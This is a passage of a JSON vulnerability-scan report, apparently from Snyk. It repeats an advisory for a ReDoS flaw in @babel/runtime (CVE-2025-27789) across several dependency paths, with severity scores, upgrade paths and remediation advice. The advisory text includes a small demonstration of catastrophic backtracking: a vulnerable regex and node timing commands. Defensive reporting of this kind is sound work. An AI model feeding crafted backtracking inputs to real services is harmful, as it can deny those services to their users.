        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/material@5.13.2",
          "@mui/system@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "@mui/system@5.18.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/system@5.13.2",
          "@mui/private-theming@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/system@5.13.2",
          "@mui/private-theming@5.17.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/styles@5.13.2",
          "@mui/private-theming@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "@mui/private-theming@5.17.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/system@5.13.2",
          "@mui/styled-engine@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/system@5.13.2",
          "@mui/styled-engine@5.18.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
